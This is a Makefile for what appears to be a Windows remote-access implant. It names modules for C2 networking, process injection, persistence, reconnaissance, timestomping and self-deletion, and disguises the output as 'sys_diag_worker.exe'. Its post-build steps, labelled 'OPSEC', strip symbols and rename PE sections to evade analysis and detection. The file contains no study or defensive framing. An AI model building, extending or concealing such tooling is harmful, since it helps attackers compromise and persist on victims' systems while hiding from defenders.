# ==========================================
# Clean Architecture Build System
# ==========================================

CC = x86_64-w64-mingw32-g++
AS = nasm

# Static OBF_KEY — avoids python3 dependency issues on Windows
OBF_KEY = 137

# Compiler Flags
CFLAGS = -std=c++14 -masm=intel -static -I. \
         -DOBF_KEY=$(OBF_KEY) \
         -s -Os -ffunction-sections -fdata-sections \
         -fno-exceptions -fno-rtti -mwindows -fno-ident

# Linker Flags (OPSEC)
LDFLAGS = -Wl,--build-id=none -Wl,--gc-sections \
          -Wl,--dynamicbase -Wl,--nxcompat -Wl,--high-entropy-va
ASFLAGS = -f win64


LIBS = 


OUT_FILE = sys_diag_worker.exe

OBJS = Core/main.o Core/api_resolve.o Core/syscalls.o Core/dispatcher.o \
       Core/syscalls_asm.o \
       Crypto/encryption.o \
       Evasion/mutex_lock.o Evasion/timestomp.o \
       Modules/file_io.o Modules/ghost.o Modules/injection.o Modules/persistence.o Modules/recon.o Modules/suicide.o \
       Network/c2_server.o \
       Utils/helpers.o


all: $(OUT_FILE)

$(OUT_FILE): $(OBJS)
	$(CC) $(OBJS) -o $(OUT_FILE) $(CFLAGS) $(LDFLAGS) $(LIBS)
	@echo "[*] Build successful: $(OUT_FILE)"
	@echo "[*] Post-build OPSEC: stripping symbols..."
	x86_64-w64-mingw32-strip --strip-all $(OUT_FILE)
	@echo "[*] Post-build OPSEC: renaming sections..."
	x86_64-w64-mingw32-objcopy \
		--rename-section .text=.a \
		--rename-section .rdata=.b \
		--rename-section .data=.c \
		--rename-section .pdata=.d \
		--rename-section .xdata=.e \
		$(OUT_FILE)
	@echo "[*] Post-build OPSEC complete."

Core/syscalls_asm.o: Core/syscalls_asm.asm
	$(AS) $(ASFLAGS) $< -o $@

%.o: %.cpp
	$(CC) -c $< -o $@ $(CFLAGS)


clean:
	rm -f $(OBJS) $(OUT_FILE)
